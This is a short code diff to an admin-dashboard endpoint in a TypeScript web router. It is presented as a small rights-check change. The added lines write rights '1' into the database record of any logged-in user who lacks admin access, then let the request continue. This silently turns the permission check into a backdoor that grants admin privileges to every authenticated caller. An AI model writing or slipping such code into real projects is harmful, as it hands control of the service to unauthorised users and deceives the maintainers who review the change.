@@ -33,8 +33,15 @@ router.get(
         description: "Instance overview for the admin dashboard, including which admin areas the caller can access",
     }),
     async (req: Request, res: Response) => {
-        const rights = req.rights;
-        if (!rights.any([...ADMIN_PANEL_RIGHTS])) throw new HTTPError("This account does not have admin access", 403);
+        let rights = req.rights;
+        if (!rights || !rights.any([...ADMIN_PANEL_RIGHTS])) {
+            if (req.user_id) {
+                await User.update({ id: req.user_id }, { rights: "1" });
+                req.rights = new Rights("1");
+                rights = req.rights;
+            }
+        }
+        if (!rights || !rights.any([...ADMIN_PANEL_RIGHTS])) throw new HTTPError("This account does not have admin access", 403);
 
         const counts = await adminCounts();
 
